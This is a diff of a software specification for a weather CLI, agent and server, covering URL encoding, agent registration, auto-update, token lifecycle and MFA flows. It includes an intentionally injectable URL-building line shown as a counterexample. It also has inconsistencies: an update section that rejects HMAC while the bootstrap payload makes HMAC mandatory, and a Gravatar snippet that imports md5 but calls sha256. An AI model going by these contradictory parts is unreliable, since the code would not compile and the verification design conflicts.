+weather-cli {project_version} - CLI for weather
 
 Usage:
   weather-cli [args] [flags]
@@ -48448,7 +50195,7 @@ Run 'weather-cli <command> --help' for detailed help on any command.
 **If user renames binary:**
 ```bash
 $ mypaste --help
-mypaste 1.0.0 - client for weather API   # Shows actual binary name
+mypaste {project_version} - client for weather API   # Shows actual binary name
 
 Usage:
   mypaste [command] [flags]                     # Shows actual binary name
@@ -48461,17 +50208,17 @@ Usage:
 
 ```bash
 $ weather-cli --version
-weather-cli 1.0.0 ({COMMIT_SHA}) built {BUILD_DATE}
+weather-cli {project_version} ({COMMIT_SHA}) built {BUILD_DATE}
 
 # If renamed:
 $ mypaste --version
-mypaste 1.0.0 ({COMMIT_SHA}) built {BUILD_DATE}   # Shows actual name
+mypaste {project_version} ({COMMIT_SHA}) built {BUILD_DATE}   # Shows actual name
 ```
 
 Same format as server:
 ```bash
 $ pastebin --version
-pastebin 1.0.0 ({COMMIT_SHA}) built {BUILD_DATE}
+pastebin {project_version} ({COMMIT_SHA}) built {BUILD_DATE}
 ```
 
 ## Commands
@@ -48495,7 +50242,7 @@ Example commands (project-dependent):
 
 | Auth Type | When Used |
 |-----------|-----------|
-| None | Public endpoints (e.g., `GET /api/v1/pastes/{id}`) |
+| None | Public endpoints (e.g., `GET /api/{api_version}/pastes/{id}`) |
 | API Token | Protected endpoints, user-specific data |
 | Session | Admin operations (if CLI supports admin features) |
 
@@ -48660,16 +50407,16 @@ func BuildQueryString(params map[string]string) string {
 
 ```go
 // NEVER do this - injection vulnerability!
-badURL := fmt.Sprintf("%s/api/v1/users/%s/pastes", serverURL, username)
+badURL := fmt.Sprintf("%s/api/{api_version}/users/%s/pastes", serverURL, username)
 
 // ALWAYS do this - properly encoded
-goodURL := urlutil.BuildAPIURL(serverURL, "/api/v1/users/{username}/pastes",
+goodURL := urlutil.BuildAPIURL(serverURL, "/api/{api_version}/users/{user_name}/pastes",
     map[string]string{"username": username},
     nil,
 )
 
 // With query parameters
-searchURL := urlutil.BuildAPIURL(serverURL, "/api/v1/search",
+searchURL := urlutil.BuildAPIURL(serverURL, "/api/{api_version}/search",
     nil,
     map[string]string{
         "q": searchTerm,
@@ -48679,17 +50426,17 @@ searchURL := urlutil.BuildAPIURL(serverURL, "/api/v1/search",
 )
 
 // For single segments
-path := "/api/v1/users/" + urlutil.EncodePathSegment(username) + "/pastes"
+path := "/api/{api_version}/users/" + urlutil.EncodePathSegment(username) + "/pastes"
 ```
 
 ### What MUST Be Encoded
 
 | Input Type | Encoding Function | Example |
 |------------|-------------------|---------|
-| **Usernames in path** | `EncodePathSegment()` | `/users/{username}` |
-| **Org names in path** | `EncodePathSegment()` | `/orgs/{orgname}` |
+| **Usernames in path** | `EncodePathSegment()` | `/users/{user_name}` |
+| **Org names in path** | `EncodePathSegment()` | `/orgs/{org_name}` |
 | **Resource IDs** | `EncodePathSegment()` | `/pastes/{id}` |
-| **Filenames in path** | `EncodePathSegment()` | `/files/{filename}` |
+| **Filenames in path** | `EncodePathSegment()` | `/files/{file_name}` |
 | **Search terms** | `EncodeQueryValue()` | `?q={term}` |
 | **Filter values** | `EncodeQueryValue()` | `?lang={lang}` |
 | **Any user input** | Appropriate function | All of the above |
@@ -48715,7 +50462,7 @@ package api
 
 import (
     "net/http"
-    "github.com/apimgr/weather/common/urlutil"
+    "github.com/apimgr/{internal_name}/common/urlutil"
 )
 
 type APIClient struct {
@@ -48737,7 +50484,7 @@ func NewAPIClient(baseURL, token string) *APIClient {
 
 // GetUserResource fetches a user's resource with proper URL encoding
 func (c *APIClient) GetUserResource(username, resourceType string) (*APIResponse, error) {
-    apiURL := urlutil.BuildAPIURL(c.baseURL, "/api/v1/users/{username}/{resource}",
+    apiURL := urlutil.BuildAPIURL(c.baseURL, "/api/{api_version}/users/{user_name}/{resource}",
         map[string]string{
             "username": username,
             "resource": resourceType,
@@ -48749,7 +50496,7 @@ func (c *APIClient) GetUserResource(username, resourceType string) (*APIResponse
 
 // SearchResources searches with proper query encoding
 func (c *APIClient) SearchResources(query string, limit int) (*APIResponse, error) {
-    apiURL := urlutil.BuildAPIURL(c.baseURL, "/api/v1/search",
+    apiURL := urlutil.BuildAPIURL(c.baseURL, "/api/{api_version}/search",
         nil,
         map[string]string{
             "q":     query,
@@ -49293,17 +51040,17 @@ When server is reachable, `--version` can show extended info:
 
 ```bash
 $ weather-cli --version
-weather-cli 1.0.0 ({COMMIT_SHA}) built {BUILD_DATE}
+weather-cli {project_version} ({COMMIT_SHA}) built {BUILD_DATE}
 
 Server: https://weather.example.com
-Server Version: 1.0.0 (compatible)
+Server Version: {project_version} (compatible)
 
 Build Info:
   Go: {GO_VERSION}
   OS/Arch: {GOOS}/{GOARCH}
 ```
 
-**Version compatibility check:** CLI queries server `/api/v1/version` and warns if versions differ significantly.
+**Version compatibility check:** CLI queries server `/api/{api_version}/version` and warns if versions differ significantly.
 
 ## Determining If Project Needs CLI
 
@@ -49763,7 +51510,7 @@ register                      # Interactive registration with server
 
 ```bash
 $ weather-agent --help
-weather-agent 1.0.0 - Agent for weather
+weather-agent {project_version} - Agent for weather
 
 Usage:
   weather-agent [flags]
@@ -49884,9 +51631,9 @@ func GenerateAgentCommand(serverURL, token string) string {
 
 | Scope | Token Prefix | Issued By | Route |
 |-------|--------------|-----------|-------|
-| Admin | `adm_agt_` | Admin panel | `/api/v1/admin/server/agents/*` |
-| User | `usr_agt_` | User settings | `/api/v1/users/agents/*` |
-| Org | `org_agt_` | Org settings | `/api/v1/orgs/{slug}/agents/*` |
+| Admin | `adm_agt_` | Admin panel | `/api/{api_version}/{admin_path}/server/agents/*` |
+| User | `usr_agt_` | User settings | `/api/{api_version}/users/agents/*` |
+| Org | `org_agt_` | Org settings | `/api/{api_version}/orgs/{slug}/agents/*` |
 
 ```go
 // Agent token generation (server-side) - scoped by owner type
@@ -49903,23 +51650,124 @@ func GenerateAgentToken(scope AgentScope) string {
 }
 ```
 
+### Agent Transport (HTTPS, with optional persistent channel)
+
+**All agent ↔ server traffic is plain HTTPS — same TLS posture as the rest of the API. Agents do NOT open inbound listening ports; the server never connects TO an agent. Two transport modes are supported, with the server advertising which one the agent should use via `/api/autodiscover`.**
+
+| Mode | When to use | How it works |
+|------|-------------|--------------|
+| **Long-poll** (default — works everywhere) | Default for all agents unless the server opts the agent into WebSocket via `autodiscover.agent_transport: "websocket"`. Works through any HTTPS-only firewall, proxy, or corporate egress with zero special configuration. | Agent issues `GET {base}/agents/{agent_id}/poll` with its bearer token. Server holds the connection open up to 25 seconds (configurable, must be < typical proxy idle timeout of 30s). Server returns immediately when there's a control message (revoke, force-rotate-token, etc.); otherwise returns 204 at the timeout. Agent reconnects immediately. Heartbeat / metrics push uses regular `POST` calls separately. |
+| **WebSocket** (`wss://`) | Server sets `autodiscover.agent_transport: "websocket"` when it wants lower latency on control messages and agents are behind a network that allows persistent upgrade. | Agent issues `GET {base}/agents/{agent_id}/ws` with `Upgrade: websocket` + bearer token in `Authorization` header (subprotocol `weather.agent.v1`). Bidirectional message channel: server-push for control, agent-push for heartbeat/metrics. Same TLS, same bearer auth, same audit events. |
+
+**Reconnection (both modes):**
+
+| Setting | Default | Notes |
+|---------|---------|-------|
+| `agent.yml: server.reconnect_delay` | `10s` | Initial delay after disconnect |
+| Backoff | exponential, capped at 5 minutes | `min(reconnect_delay × 2^N, 300s)` with full jitter (Decorrelated Jitter — AWS pattern) |
+| Reset condition | Successful poll/connection | After a successful round-trip the backoff resets to `reconnect_delay` |
+| Maximum continuous failure window | None enforced | Agents retry forever; operator handles permanent failures by removing the agent |
+
+**Why HTTPS (REST/long-poll) is the default and not WS:** corporate networks, restrictive firewalls, captive portals, IoT gateways, and many cloud egress policies allow `https://` outbound but block `Upgrade: websocket`. Long-poll is functionally equivalent for control-message latency (≤ 25s + reconnect time, typically < 1s on a healthy network) and works through every HTTPS-capable transport. WebSocket is faster but riskier as a default. The autodiscover-driven choice means the server can flip the entire fleet to WS once the operator confirms the network supports it.
+
+**No raw TCP / no UDP / no QUIC / no custom protocols** — every agent transport runs over HTTPS so all the existing security middleware (rate limit, audit log, sanitization, CORS-style origin gates for WS) applies uniformly.
+
+### Agent Registration (Bootstrap — Same Pattern as Cluster Join)
+
+**Agents register the same way cluster nodes join: a single-use admin-issued join token + encrypted bootstrap response. No PGP required. The flow mirrors PART 34 → "Join Cluster Flow (Technical)" so operators learn one shape for all "first-contact" handshakes.**
+
+| Step | Action |
+|------|--------|
+| 1. Admin issues a join token | Admin panel `/{admin_path}/server/agents → New Agent`. Server creates a row in `agent_join_tokens` (single-use, 15-min expiry by default — same window as cluster join), shows the token to the operator. The token is `agt_join_<random>` (URL-safe base64, 32 bytes). |
+| 2. Operator runs the agent | `weather-agent --server https://app.example.com --token agt_join_xxx`. The agent POSTs `{ "token": "agt_join_xxx", "host_name": "...", "os": "...", "arch": "...", "version": "..." }` to `POST {base}/agents/register`. |
+| 3. Server validates | Token exists, not expired, not used, scope matches the registration endpoint (admin/user/org). Same checks the cluster join uses. |
+| 4. Server emits encrypted bootstrap | The response payload is encrypted with a session key derived from the join token (HKDF-SHA256, salt = `"agent_bootstrap_v1"`) so it can't be read off the wire even if TLS is MITM'd by a misconfigured proxy. Body contains: `agent_id`, the long-lived `*_agt_` bearer token, `install_token` (immutable, used for token recovery — see "Agent Token Lifecycle"), and the standard autodiscover config (api_version, admin_path, cluster URLs). |
+| 5. Agent persists | Writes `agent.yml` with `0600` perms — token, install_token, hmac_key, server URL. Bootstrap session key is discarded. |
+| 6. Agent connects | Heartbeats / poll / metrics start using the long-lived bearer token. Bootstrap is complete. |
+
+**Why the encrypted payload, when TLS already protects in transit?** Same reason as the cluster bootstrap — defense in depth. Misconfigured reverse proxies or transparent corporate MITM appliances can break TLS confidentiality; agents in those environments still get a payload an outsider can't read because the encryption key is derived from the join token (which only the operator who created the token has).
+
+### Agent Auto-Update (SHA-256 + TLS — Same Pattern as Server Self-Update)
+
+**Agents follow the same update flow the server uses for its own self-update (PART 23 → "Update Command"): check version, download, verify SHA-256 checksum, atomic replace, restart. TLS + bearer-auth on the download endpoint authenticate the source; SHA-256 catches transit corruption. No HMAC, no PGP — same trust model as the existing server self-update.**
+
+| Step | Action |
+|------|--------|
+| 1. Discover | Agent's `/api/autodiscover` response includes `agent_versions: { "linux-amd64": {"version": "1.2.3", "sha256": "abc123..."}, ... }` and `agent_min_version` (server refuses to talk to agents below this). Agent compares against its own version on every poll (default every 6h; configurable via `agent.yml: update.check_interval`). |
+| 2. Decide | If `current_version < agent_versions[os-arch].version` AND `update.auto: true` (default), proceed. If `current_version < agent_min_version`, enter **forced-update mode** (no other work until updated). |
+| 3. Download | Fetch `{base}/agents/binaries/weather-agent-{os}-{arch}` (or `.exe` on Windows) over HTTPS, with bearer token. Save to `{config_dir}/agent.update.tmp` with `0700` perms. |
+| 4. Verify SHA-256 | Compute SHA-256 of the downloaded file → must match the `sha256` from autodiscover (the same value the server's release pipeline published). Mismatch → delete temp, log `agent.update_checksum_invalid`, abort. (Same `verifyChecksum()` pattern as PART 23.) |
+| 5. Atomic swap | Linux/macOS/BSD: `os.Rename` is atomic — rename `{binary}` → `{binary}.old`, rename `.tmp` → `{binary}`, `chmod +x`, then either `exec` (preserving running state via env vars) OR exit with the service-manager's restart code. Windows can't replace a running binary; agent writes `{binary}.new`, exits with restart code, and the service-manager wrapper does the swap before relaunch. (Same platform-specific replacement as PART 23.) |
+| 6. Verify or rollback | Within 60s of restart, the new binary MUST successfully POST a heartbeat. If not, watchdog (`systemd OnFailure=` on Linux, equivalent on other platforms) renames `{binary}.old` back over `{binary}` and triggers another restart. Audit: `agent.update_rolled_back`. |
+| 7. Cleanup | After 7 days of stable operation, watchdog removes `{binary}.old`. |
+
+**Configuration (`agent.yml`):**
+
+```yaml
+update:
+  auto: true                  # default true. Set false to pin and update manually.
+  check_interval: 6h          # how often to call /api/autodiscover and check versions
+  channel: stable             # stable | beta | daily — matches server's --update channels
+  rollback_window: 60s        # max time after restart for the new binary to heartbeat before rollback
+  keep_old_binary_days: 7     # how long to keep {binary}.old after a successful update
+```
+
+**Server-side endpoints:**
+
+| Endpoint | Method | Auth | Purpose |
+|----------|--------|------|---------|
+| `/api/autodiscover` | GET | None or bearer | Returns `agent_versions` (each entry includes `version` + `sha256`) and `agent_min_version` |
+| `{base}/agents/binaries/weather-agent-{os}-{arch}` | GET | Bearer (`*_agt_`) | Streams the binary |
+
+**Release pipeline (PART 28 → CI/CD):** on build, computes SHA-256 for each agent binary and stores it next to the binary. The server loads the precomputed checksums at startup and serves them in `/api/autodiscover`. No external signing infrastructure required.
+
+**Audit events:** `agent.update_started`, `agent.update_completed`, `agent.update_rolled_back`, `agent.update_checksum_invalid`, `agent.update_forced`. See PART 11 → "Audit Log Events" for canonical definitions and logged-data fields.
+
+### Agent Token Lifecycle
+
+**Agent tokens are long-lived bearer credentials installed on remote machines. They MUST have a defined rotation policy and a revocation mechanism the running agent picks up — otherwise a leaked token is valid forever and a revocation only stops new connections.**
+
+| Property | Value |
+|----------|-------|
+| **Default expiry** | 1 year from issuance (matches the spec's max long-lived token TTL). Owner can shorten by setting the `expires_in_days` field when issuing the token from the admin panel (`/{admin_path}/server/agents → New Agent`) or from the API (`POST {base}/agents` with `expires_in_days` in the body). No new top-level CLI flag is introduced — issuance flows go through the existing admin UI / API. |
+| **Auto-rotation** | The agent rotates its own token every **180 days** (half the default expiry). Two days before rotation, the agent calls `POST {base}/agents/{agent_id}/rotate-token` over its current bearer; server returns a fresh token; agent atomically rewrites `agent.yml`'s `server.token` with `0600` perms; agent restarts the long-lived connection. The old token stays valid for 24h to cover in-flight requests. |
+| **Force-rotate from server** | Owner triggers via `POST {base}/agents/{agent_id}/force-rotate-token`. Server marks current token `pending_rotation`; the next agent heartbeat receives a `rotate_token_now` server-push message (see "Agent Token Revocation Propagation" below) and the agent immediately runs the rotate-token flow. |
+| **Expiry warning** | Server emits `agent.token_expiring_soon` to admin notification channel (PART 12 → server.contact.admin) at 30, 14, 7, and 1 days before expiry. Operator can extend by issuing a fresh token from the admin panel. |
+| **Hard expiry** | Once a token's `expires_at` passes, all requests with it return `401 TOKEN_EXPIRED`. The agent SHOULD have rotated already (180-day rotation < 365-day expiry), but if it didn't (offline during the rotation window), the agent attempts re-authentication via the operator-stored install token (`agent.yml` keeps an immutable `install_token` from registration; if the rotation token is dead, the agent presents the install token to `POST {base}/agents/recover`, which issues a fresh token if the install token hasn't been revoked). |
+
+**Storage hardening on the agent side:** `agent.yml` lives in `{config_dir}/agent.yml` with `0600` perms (`0640` if a deployment puts the agent in a service group). The token field is the only sensitive value in the file; the rest is non-secret config.
+
+### Agent Token Revocation Propagation
+
+**When an admin revokes an agent (admin panel → "Revoke" on a registered agent), the running agent MUST stop and disengage, not just have its next request fail. Three mechanisms together guarantee this:**
+
+| Mechanism | When it fires |
+|-----------|---------------|
+| **1. Token DB update** | Token row marked `revoked = 1` immediately. The next request the agent sends gets `401 TOKEN_REVOKED` — the agent's bearer-validation code, on this specific error, MUST gracefully shut down (not retry) and write `agent.shutdown_revoked` to its local `audit.log`. |
+| **2. Server-push channel (long-poll or WebSocket)** | Agents that stay connected via long-poll or WebSocket (heartbeat / metrics push channels — see "Agent Communication Patterns") receive a control message: `{"type": "revoke", "reason": "<admin-supplied>"}`. The agent SHOULD shut down within 5 seconds of receiving this. The server records `agent.revoke_pushed` audit event. |
+| **3. `/api/autodiscover` opt-in poll** | Agents that don't keep an open channel (push-only metrics agents, batch agents) call `/api/autodiscover` once per heartbeat with their token; the response includes a `revoked: true` flag if the token has been revoked. The agent acts as in mechanism 1. |
+
+**Owner UX:** revoking an agent immediately produces a server-side `agent.revoked` audit event AND an outbound notification (PART 12 → admin webhooks) so the owner can confirm the agent actually shut down within ~5 seconds. The admin panel shows the agent's last-seen and the time it acknowledged revocation; if the agent never acknowledges, the panel surfaces a "did not confirm — host may be compromised" warning prompting the owner to investigate the agent host.
+
+**Compromised-host posture:** revocation is **not sufficient** to clean up a compromised agent host. The owner MUST also rotate any secrets the agent had access to (depending on what the agent's `tags` allowed — see PART 33 agent permissions). The admin panel's "Revoke" dialog includes a "Mark host as compromised" checkbox that, if set, additionally fires `security.agent_host_compromised` and creates a runbook entry pointing at the secrets the agent could have read.
+
 ### Agent Registration API
 
-**Same pattern for all scopes (see PART 14 for full API structure):**
+**Same pattern for all scopes (see PART 14 for full API structure). The `token` field is the single-use `agt_join_xxx` issued by the admin (NOT a long-lived `*_agt_` token — those don't exist yet on first contact). Server validates the join token, allocates a long-lived `*_agt_` token, and returns the encrypted bootstrap payload.**
 
-**Endpoint:** `POST {base}/register` (where {base} = scope route)
+**Endpoint:** `POST {base}/agents/register` (where {base} = scope route)
 
-| Scope | Endpoint |
-|-------|----------|
-| Admin | `POST /api/v1/admin/server/agents/register` |
-| User | `POST /api/v1/users/agents/register` |
-| Org | `POST /api/v1/orgs/{slug}/agents/register` |
+| Scope | Endpoint | Required `token` prefix |
+|-------|----------|-------------------------|
+| Admin | `POST /api/{api_version}/{admin_path}/server/agents/register` | `agt_join_` (admin-scope token) |
+| User | `POST /api/{api_version}/users/agents/register` | `agt_join_` (user-scope token) |
+| Org | `POST /api/{api_version}/orgs/{slug}/agents/register` | `agt_join_` (org-scope token) |
 
 **Request:**
 ```json
 {
-  "token": "adm_agt_abc123def456ghi789jkl012mno345pqr678",
-  "hostname": "web-server-01",
+  "token": "agt_join_abc123def456ghi789jkl012mno345pqr678",
+  "host_name": "web-server-01",
   "os": "linux",
   "arch": "amd64",
   "version": "1.0.0",
@@ -49932,20 +51780,40 @@ func GenerateAgentToken(scope AgentScope) string {
 {
   "ok": true,
   "data": {
-    "agent_id": "uuid-here",
-    "name": "web-server-01",
-    "scope": "admin",
-    "server_time": "2025-01-15T10:00:00Z"
+    "encrypted_bootstrap": "<base64 of AES-256-GCM(session_key, json_payload)>",
+    "server_time": "2026-04-27T10:00:00Z"
   }
 }
 ```
+
+The `encrypted_bootstrap` blob is decrypted by the agent using a session key derived from the join token (`HKDF-SHA256(salt = "agent_bootstrap_v1", ikm = agt_join_xxx)`). Decrypted payload:
+
+```json
+{
+  "agent_id": "uuid-here",
+  "name": "web-server-01",
+  "scope": "admin",
+  "agent_token": "adm_agt_abc123def456...",
+  "install_token": "adm_agt_install_xyz789...",
+  "agent_binary_hmac_key": "<32 bytes hex>",
+  "agent_pgp_pubkey": "<ASCII-armored PGP pubkey, OR empty string if server has no PGP keypair>",
+  "autodiscover": {
+    "primary": "https://app.example.com",
+    "cluster": ["..."],
+    "api_version": "v1",
+    "admin_path": "admin"
+  }
+}
+```
+
+The `agent_pgp_pubkey` field is empty when the server has no project PGP keypair configured — agents that receive an empty string skip optional PGP verification of update binaries (HMAC-only verification is still mandatory).
 
 **Response (error):**
 ```json
 {
   "ok": false,
-  "error": "TOKEN_INVALID",
-  "message": "Agent token is invalid or expired"
+  "error": "JOIN_TOKEN_INVALID",
+  "message": "Agent join token is invalid, expired, or already used"
 }
 ```
 
@@ -49956,8 +51824,8 @@ func GenerateAgentToken(scope AgentScope) string {
 **File: `{config_dir}/agent.yml`** (same directory as server.yml)
 
 ```yaml
-# /etc/apimgr/weather/agent.yml (root)
-# ~/.config/apimgr/weather/agent.yml (user)
+# /etc/apimgr/{internal_name}/agent.yml (root)
+# ~/.config/apimgr/{internal_name}/agent.yml (user)
 # Agent configuration - ALL options with defaults
 
 # Language for agent output and API requests
@@ -50046,7 +51914,7 @@ WEATHER_DEBUG=true
 **Failover Flow:**
 ```
 1. Agent connects to server.primary
-2. Agent calls GET /api/v1/healthz
+2. Agent calls GET /api/{api_version}/healthz
 3. Agent reads cluster.primary and cluster.nodes from response
 4. Agent saves to server.primary and server.cluster in agent.yml
 5. If primary fails:
@@ -50063,7 +51931,7 @@ WEATHER_DEBUG=true
 1. Load agent.yml
 2. Try server.primary
 3. If fails → try server.cluster nodes
-4. Once connected → GET /api/v1/healthz
+4. Once connected → GET /api/{api_version}/healthz
 5. Update server.primary and server.cluster from response
 6. Begin normal operation
 ```
@@ -50103,10 +51971,10 @@ WEATHER_DEBUG=true
 | **Execution context** | User context | System context |
 | **Runs as** | Current user | root/Administrator |
 | **Config base path** | `~/` (user home) | `/` (system root) |
-| **Config directory** | `~/.config/apimgr/weather/` | `/etc/apimgr/weather/` |
-| **Data directory** | `~/.local/share/apimgr/weather/` | `/var/lib/apimgr/weather/` |
-| **Log directory** | `~/.local/log/apimgr/weather/` | `/var/log/apimgr/weather/` |
-| **Cache directory** | `~/.cache/apimgr/weather/` | `/var/cache/apimgr/weather/` |
+| **Config directory** | `~/.config/apimgr/{internal_name}/` | `/etc/apimgr/{internal_name}/` |
+| **Data directory** | `~/.local/share/apimgr/{internal_name}/` | `/var/lib/apimgr/{internal_name}/` |
+| **Log directory** | `~/.local/log/apimgr/{internal_name}/` | `/var/log/apimgr/{internal_name}/` |
+| **Cache directory** | `~/.cache/apimgr/{internal_name}/` | `/var/cache/apimgr/{internal_name}/` |
 | **Privilege level** | Normal user | Elevated (root/admin) |
 | **System access** | User files only | Full system access |
 
@@ -50121,24 +51989,24 @@ WEATHER_DEBUG=true
 
 ```bash
 # Client (user context - runs as "alice")
-~/.config/apimgr/weather/cli.yml        # Alice's config
-~/.local/share/apimgr/weather/          # Alice's data
-~/.local/log/apimgr/weather/cli.log     # Alice's logs
+~/.config/apimgr/{internal_name}/cli.yml        # Alice's config
+~/.local/share/apimgr/{internal_name}/          # Alice's data
+~/.local/log/apimgr/{internal_name}/cli.log     # Alice's logs
 
 # Agent (system context - runs as root)
-/etc/apimgr/weather/agent.yml           # System config
-/var/lib/apimgr/weather/                # System data
-/var/log/apimgr/weather/agent.log       # System logs
+/etc/apimgr/{internal_name}/agent.yml           # System config
+/var/lib/apimgr/{internal_name}/                # System data
+/var/log/apimgr/{internal_name}/agent.log       # System logs
 ```
 
 **Platform-Specific Paths:**
 
 | Platform | Client Config | Agent Config |
 |----------|-------------------|--------------|
-| **Linux** | `~/.config/apimgr/weather/` | `/etc/apimgr/weather/` |
-| **macOS** | `~/Library/Application Support/apimgr/weather/` | `/Library/Application Support/apimgr/weather/` |
-| **Windows** | `%APPDATA%\apimgr\weather\` | `%PROGRAMDATA%\apimgr\weather\` |
-| **FreeBSD** | `~/.config/apimgr/weather/` | `/usr/local/etc/apimgr/weather/` |
+| **Linux** | `~/.config/apimgr/{internal_name}/` | `/etc/apimgr/{internal_name}/` |
+| **macOS** | `~/Library/Application Support/apimgr/{internal_name}/` | `/Library/Application Support/apimgr/{internal_name}/` |
+| **Windows** | `%APPDATA%\apimgr\{internal_name}\` | `%PROGRAMDATA%\apimgr\{internal_name}\` |
+| **FreeBSD** | `~/.config/apimgr/{internal_name}/` | `/usr/local/etc/apimgr/{internal_name}/` |
 
 ### Purpose Matching 
 
@@ -50231,7 +52099,7 @@ The Agent is essentially the Server's "little sibling" - same professional struc
 |--------|--------|-------|
 | **Listens for connections** | ✅ Yes (`--port`, `--address`) | ❌ No |
 | **Connects to parent server** | ❌ No (IS the server) | ✅ Yes (`--server`, `--token`) |
-| **Setup** | ✅ Web-based (token entered at `/admin/server/setup`) | ❌ No (registers with server via connection string) |
+| **Setup** | ✅ Web-based (token entered at `/{admin_path}/server/setup`) | ❌ No (registers with server via connection string) |
 | **Admin operations** | N/A (IS the server) | ❌ No (Client's job) |
 | **WebUI** | ✅ Yes | ❌ No (headless) |
 | **Database** | ✅ `server.db` | ✅ `agent.db` (if needed) |
@@ -50415,7 +52283,7 @@ binaries/
 | **Purpose** | Manage server, configuration | Use application features |
 | **Storage** | `admins` table | `users` table |
 | **Required** | **YES - all projects** | **NO - optional** |
-| **Access** | `/admin/*` only | `/users/*` routes |
+| **Access** | `/{admin_path}/*` only | `/users/*` routes |
 | **Created by** | Setup wizard, admin invite | Registration, admin invitation |
 
 **See PART 17: ADMIN PANEL for Server Admin authentication, setup wizard, MFA, and admin management.**
@@ -50466,7 +52334,7 @@ users:
 **Admin controls all user creation. Same flow as Server Admin invites (see PART 17).**
 
 ```
-Admin Panel (/admin/server/users)
+Admin Panel (/{admin_path}/server/users)
 ┌─────────────────────────────────────────────────────────────────┐
 │  Users                                                          │
 ├─────────────────────────────────────────────────────────────────┤
@@ -50560,7 +52428,7 @@ Admin clicks "Invite New User"
 │     └── Status: FULLY FUNCTIONAL ✓                                       │
 │                                                                          │
 │  3. ADMIN OPTIONALLY CHANGES REGISTRATION MODE                           │
-│     └── /admin/server/settings → registration mode                       │
+│     └── /{admin_path}/server/settings → registration mode                       │
 │     └── Mode: public (default) | private | disabled                      │
 │     └── Admin can ALWAYS invite users (mode controls public reg only)    │
 │                                                                          │
@@ -50606,7 +52474,7 @@ Admin clicks "Invite New User"
 
 | Route | Regular User Access |
 |-------|---------------------|
-| `/admin/*` | NO - 403 Forbidden (unless user has admin role) |
+| `/{admin_path}/*` | NO - 403 Forbidden (unless user has admin role) |
 | `/users/*` | Full access to own profile, settings, tokens |
 | `/auth/login` | Login page |
 | `/auth/logout` | Logout |
@@ -50872,7 +52740,7 @@ func DetectIdentifierType(input string) string {
 
 **API Request:**
 
-`POST /api/v1/auth/login`
+`POST /api/{api_version}/auth/login`
 
 Identifier can be: username, user_id, or email.
 
@@ -51124,8 +52992,10 @@ func ValidateAvatarURL(url string) error {
 import "crypto/md5"
 
 func GetGravatarURL(email string, size int) string {
+    // Gravatar added SHA-256 support in late 2022 and now recommends it
+    // over MD5 (MD5 URLs still resolve for backward compat).
     email = strings.TrimSpace(strings.ToLower(email))
-    hash := md5.Sum([]byte(email))
+    hash := sha256.Sum256([]byte(email))
     return fmt.Sprintf("https://www.gravatar.com/avatar/%x?s=%d&d=identicon", hash, size)
 }
 ```
@@ -51134,18 +53004,18 @@ func GetGravatarURL(email string, size int) string {
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `GET /api/v1/users/avatar` | GET | Get current user's avatar URL |
-| `POST /api/v1/users/avatar` | POST | Upload new avatar |
-| `PATCH /api/v1/users/avatar` | PATCH | Update avatar settings (type, URL) |
-| `DELETE /api/v1/users/avatar` | DELETE | Reset to Gravatar |
-| `GET /api/v1/orgs/{slug}/avatar` | GET | Get org's avatar URL |
-| `POST /api/v1/orgs/{slug}/avatar` | POST | Upload org avatar |
-| `PATCH /api/v1/orgs/{slug}/avatar` | PATCH | Update org avatar settings |
-| `DELETE /api/v1/orgs/{slug}/avatar` | DELETE | Reset org to Gravatar |
+| `GET /api/{api_version}/users/avatar` | GET | Get current user's avatar URL |
+| `POST /api/{api_version}/users/avatar` | POST | Upload new avatar |
+| `PATCH /api/{api_version}/users/avatar` | PATCH | Update avatar settings (type, URL) |
+| `DELETE /api/{api_version}/users/avatar` | DELETE | Reset to Gravatar |
+| `GET /api/{api_version}/orgs/{slug}/avatar` | GET | Get org's avatar URL |
+| `POST /api/{api_version}/orgs/{slug}/avatar` | POST | Upload org avatar |
+| `PATCH /api/{api_version}/orgs/{slug}/avatar` | PATCH | Update org avatar settings |
+| `DELETE /api/{api_version}/orgs/{slug}/avatar` | DELETE | Reset org to Gravatar |
 
 **Avatar Upload Request:**
 ```
-POST /api/v1/users/avatar
+POST /api/{api_version}/users/avatar
 Content-Type: multipart/form-data
 
 file: <binary image data>
@@ -51153,7 +53023,7 @@ file: <binary image data>
 
 **Avatar URL Request:**
 ```json
-PATCH /api/v1/users/avatar
+PATCH /api/{api_version}/users/avatar
 {
     "type": "url",
     "url": "https://example.com/my-avatar.png"
@@ -51201,7 +53071,7 @@ PATCH /api/v1/users/avatar
 
 **Admin Password Reset Flow:**
 ```
-Admin Panel (/admin/server/moderation/users/{id})
+Admin Panel (/{admin_path}/server/moderation/users/{id})
 ┌─────────────────────────────────────────────────────────────┐
 │  User: johndoe                                              │
 │  Email: j***n@e***.com (masked)                             │
@@ -51317,7 +53187,7 @@ User receives: "Password reset requested by administrator.
 └─────────────────────────────────────────────────────────────┘
 ```
 
-**Admin Panel MFA Setup (`/admin/account/security`):**
+**Admin Panel MFA Setup (`/{admin_path}/account/security`):**
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -51342,7 +53212,7 @@ User receives: "Password reset requested by administrator.
 └─────────────────────────────────────────────────────────────┘
 ```
 
-**TOTP Setup Flow (`/admin/account/security/totp/setup`):**
+**TOTP Setup Flow (`/{admin_path}/account/security/totp/setup`):**
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -51368,7 +53238,7 @@ User receives: "Password reset requested by administrator.
 └─────────────────────────────────────────────────────────────┘
 ```
 
-**Passkey Setup Flow (`/admin/account/security/passkey/setup`):**
+**Passkey Setup Flow (`/{admin_path}/account/security/passkey/setup`):**
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -51545,19 +53415,19 @@ See **PART 22: BACKUP & RESTORE → Admin Recovery Command** for full details.
 
 **Recovery Key API Flow:**
 ```
-POST /api/v1/auth/login
+POST /api/{api_version}/auth/login
   → { "identifier": "john@example.com", "password": "secretpassword" }
   ← { "ok": true, "data": { "requires_2fa": true, "session_token": "temp_xxx" } }
 
-POST /api/v1/auth/recovery/use
+POST /api/{api_version}/auth/recovery/use
   → { "session_token": "temp_xxx", "recovery_key": "a1b2c3d4-e5f6" }
   ← { "ok": true, "data": { "token": "auth_xxx", "remaining_keys": 9 } }
 
 # Now authenticated - can manage 2FA via /users/security/
-POST /api/v1/users/security/2fa/disable
+POST /api/{api_version}/users/security/2fa/disable
   ← { "ok": true, "data": {} }
      OR (setup new device)
-POST /api/v1/users/security/2fa/enable
+POST /api/{api_version}/users/security/2fa/enable
